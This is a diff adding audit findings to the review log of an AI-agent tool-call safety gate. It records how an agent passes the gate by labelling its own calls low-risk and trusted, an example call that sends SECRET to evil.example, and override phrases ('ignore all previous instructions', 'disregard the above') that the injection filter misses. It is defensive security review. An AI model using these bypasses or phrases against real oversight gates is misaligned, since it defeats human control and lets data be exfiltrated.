@@ -40,6 +40,17 @@ analysis or data exists.
     295 source clusters. They share 67 proposed tools, and the decision
     depends on the tool (PRF-009).
 
+- R2 (2026-10-17). An external read of the repository at `d66828d` that also
+  ran the test suite. It reported three ways past the advisory library path
+  (PRF-040 to PRF-042). The maintainer reproduced them, with one
+  correction: an attack reaches ACCEPT only when the caller also supplies
+  a low risk tier, a read action type and a high trust score. Without
+  those labels the same calls route to VERIFY or ABSTAIN. R2's statement
+  that the gate cut AgentHarm recall to 11 % counts only hard ESCALATE.
+  Counting VERIFY, Mode 3 blocked 43 of 44 harmful tasks. The finding
+  behind it is real: Mode 3 tells no twin pair apart where the oracle
+  alone tells 29 apart (NEGATIVE_RESULTS.md §80).
+
 ## Level plan (owner decision, 2026-10-17)
 
 1. Level 1: text corrections that need no new numbers.
@@ -563,3 +574,43 @@ conditions?
 | Owning PR | level-1 PR |
 | Verification | The roadmap now states the point-estimate target, the 1.29% bound and the 381-episode requirement. |
 | Status | RESOLVED |
+
+### PRF-040 The library path trusts caller-supplied risk, action type and trust
+
+| Field | Value |
+|---|---|
+| Severity | MAJOR |
+| Claim | `assess_tool_call("xfer", {"to": "attacker", "amt": 1e6}, risk_tier="low", action_type="read", trust_score=0.95, phase="ordered")` returns ACCEPT. An untrusted agent that labels its own call decides the outcome. |
+| Evidence | Reproduced 2026-10-17 on `bce4bfeb`. Without the labels the same call returns VERIFY. The README states that the library call is advisory and that enforcement is `/v1/execution/*`, where risk comes from a registry keyed by tool name. |
+| Affected claims | none (no claim measures the library path) |
+| Action | Level 3: the threat model must state that labels from the agent are untrusted. The library API should refuse caller labels by default, or mark its result advisory in the type; a test should pin that an untrusted label cannot raise autonomy. |
+| Owning PR | not yet opened (touches `remora/policy/`, a protected path) |
+| Verification | Pending. |
+| Status | OPEN |
+
+### PRF-041 No assessment of argument content, so a read tool can exfiltrate
+
+| Field | Value |
+|---|---|
+| Severity | MAJOR |
+| Claim | `http_get(url="https://evil.example/?k=SECRET")` labelled low/read with high trust returns ACCEPT. Nothing inspects argument values for secrets or destinations, and nothing tracks data across calls. |
+| Evidence | Reproduced 2026-10-17 on `bce4bfeb`. On the server path, taint comes from a request field the agent can omit. §13.13 of the paper already disclaims trajectory-level and data-flow enforcement. |
+| Affected claims | none |
+| Action | Level 3: put argument-content and destination policy in the threat model, and measure exfiltration in the attack evaluation (PRF-015) against a policy-only and an information-flow baseline. |
+| Owning PR | not yet opened |
+| Verification | Pending. |
+| Status | OPEN |
+
+### PRF-042 The injection pattern list misses simple paraphrases
+
+| Field | Value |
+|---|---|
+| Severity | MINOR |
+| Claim | "ignore previous instructions" escalates, but "ignore all previous instructions" and "disregard the above" are not classified as injection. |
+| Evidence | Reproduced 2026-10-17 on `bce4bfeb`. Both paraphrases route to VERIFY, not ACCEPT, with high-trust low/read labels. A substring list cannot be a security boundary, and the paper does not claim it is one. |
+| Affected claims | none |
+| Action | Do not grow the list as a defence. State in the threat model that pattern matching is a hint, and measure injection with an external benchmark (AgentDojo or InjecAgent) in level 3. |
+| Owning PR | not yet opened |
+| Verification | Pending. |
+| Status | OPEN |
+
